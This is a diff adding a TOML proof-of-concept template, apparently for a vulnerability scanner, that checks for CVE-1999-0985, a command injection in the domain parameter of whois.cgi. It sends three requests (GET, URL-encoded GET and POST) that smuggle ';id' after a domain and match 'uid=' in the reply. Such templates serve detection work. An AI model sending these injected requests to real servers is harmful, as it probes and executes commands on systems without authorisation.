@@ -1,0 +1,74 @@
+[info]
+author = "ave"
+description = "验证 CGI City CC Whois 1.0 whois.cgi 域名参数命令注入漏洞"
+id = "POC-AVE-1999-1520"
+name = "CVE-1999-0985 PoC"
+severity = "high"
+tags = ["ave-1999-1520"]
+vuln_id = [
+    "CVE-1999-0985",
+    "AVE-1999-1520",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/whois.cgi?domain=example.com;id"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/whois.cgi?domain=example.com%3Bid"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/whois.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "domain=example.com;id"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "uid=",
+    "gid=",
+    "groups=",
+]
